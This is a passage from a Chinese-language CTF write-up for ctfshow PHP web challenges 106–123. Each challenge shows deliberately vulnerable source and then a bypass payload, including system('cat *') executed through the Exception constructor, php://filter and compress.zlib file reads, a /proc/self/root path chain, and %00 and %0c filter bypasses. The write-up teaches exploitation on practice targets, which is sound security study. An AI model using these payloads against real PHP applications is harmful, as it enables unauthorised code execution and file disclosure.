class="code"><pre><span class="line">GET: ?suces&#x3D;flag&amp;flag&#x3D;1</span><br><span class="line">POST flag&#x3D;</span><br></pre></td></tr></table></figure><h3 id="Web106">Web106</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>数组绕过</p><h3 id="web107">web107</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       parse_str($v1,$v2);</span><br><span class="line">       <span class="keyword">if</span>($v2[<span class="string">&#x27;flag&#x27;</span>]==md5($v3))&#123;</span><br><span class="line">           <span class="keyword">echo</span> $flag;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>弱类型比较</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: ?v3&#x3D;byGcY</span><br><span class="line">POST: v1&#x3D;flag&#x3D;0e00</span><br></pre></td></tr></table></figure><blockquote><p>parse_str ( string <code>$encoded_string</code> [, array <code>&amp;$result</code> ] ) : void</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encoded_string</span><br></pre></td></tr></table></figure><p>输入的字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result</span><br></pre></td></tr></table></figure><p>如果设置了第二个变量 <code>result</code>， 变量将会以数组元素的形式存入到这个数组，作为替代。</p><p>PHP7.2版本以上必须有result参数</p></blockquote><h3 id="web108">web108</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, $_GET[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev($_GET[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ereg存在%00截断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;a%00778</span><br></pre></td></tr></table></figure><h3 id="web109">**web109</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, $v1) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>据说这题目出的有点问题，但是我还是不知道Exception的构造函数可以执行代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;Exception&amp;v2&#x3D;system(&#39;cat *&#39;)</span><br></pre></td></tr></table></figure><h3 id="web110">**web110</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用 FilesystemIterator 获取指定目录下的所有文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</span><br></pre></td></tr></table></figure><p>然后直接访问文件。</p><h3 id="web111">**web111</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;$v1,&amp;$v2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接看payload吧。。使用全局变量来进行赋值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS</span><br></pre></td></tr></table></figure><blockquote><p>$GLOBALS — 引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p></blockquote><p><code>$$v1 = &amp;$$v2</code>等价于<code>$ctfshow=&amp;$GLOBALS</code>。</p><h3 id="web112">web112</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>is_file可以用伪协议绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(is_file(<span class="string">&#x27;test.php&#x27;</span>)); <span class="comment">// bool(true)</span></span><br><span class="line">var_dump(is_file(<span class="string">&#x27;php://filter/convert.base64-encode/resource=test.php&#x27;</span>)); <span class="comment">// bool(false)</span></span><br><span class="line">var_dump(is_file(<span class="string">&#x27;file:///flag&#x27;</span>)); <span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure><p>过滤base64、rot13和string编码，其实不用编码也行</p><blockquote><p>PHP支持的字符编码https://www.php.net/manual/zh/mbstring.supported-encodings.php</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><p>或者换一个编码方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><p>如果过滤了php和filter，可以换一种伪协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php</span><br></pre></td></tr></table></figure><h3 id="web113">web113</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以用上一道题的payload。</p><p>也可以用伪协议配合多级符号链接的办法进行绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure><h3 id="web114">web114</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web115">**web115</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$num</span>)</span>&#123;</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($num) <span class="keyword">and</span> $num!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim($num)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter($num)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要考察trim绕过，从源码可以看出，过滤的空白字符少了一个\f，用%0c过。并且，is_numeric函数开始判断之前，首先会跳过所有空白字符。</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;%0c36</span><br></pre></td></tr></table></figure><h3 id="web123">web123</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, $c)&amp;&amp;$c&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个点在于PHP变量命名是不允许使用点号的，存在点号的参数出入后会被解析成下划线<code>_</code>。</p><p>yu22x师傅提到用Fuzz的方式暴力破解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url,$data</span>)</span>&#123;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span><br><span class="line">$response = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">return</span> strlen($response);</span><br><span class="line">&#125;</span><br><span class="line">$url=<span class="string">&quot;http://127.0.0.1/test.php&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt;=<span class="number">128</span> ; $i++) &#123; </span><br><span class="line"><span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt;=<span class="number">128</span> ; $j++) &#123;</span><br><span class="line">$data=<span class="string">&quot;CTF&quot;</span>.urlencode(chr($i)).<span class="string">&quot;SHOW&quot;</span>.urlencode(chr($j)).<span class="string">&quot;COM&quot;</span>.<span class="string">&quot;=123&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(curl($url,$data)!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $data.<span class="string">&quot;\n&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现<code>CTF[SHOW.COM</code>是可以绕过的。</p><p>第二个知识点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、cli模式（命令行）下</span><br><span class="line"></span><br><span class="line">第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数</span><br><span class="line"></span><br><span class="line">2、web网页模式下</span><br><span class="line"></span><br><span class="line">在web页模式下必须在php.ini开启register_argc_argv配置项</span><br><span class="line"></span><br><span class="line">设置register_argc_argv &#x3D; On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果</span><br><span class="line"></span><br><span class="line">这时候的$_SERVER[‘argv’][0] &#x3D; $_SERVER[‘QUERY_STRING’]</span><br><span class="line"></span><br><span 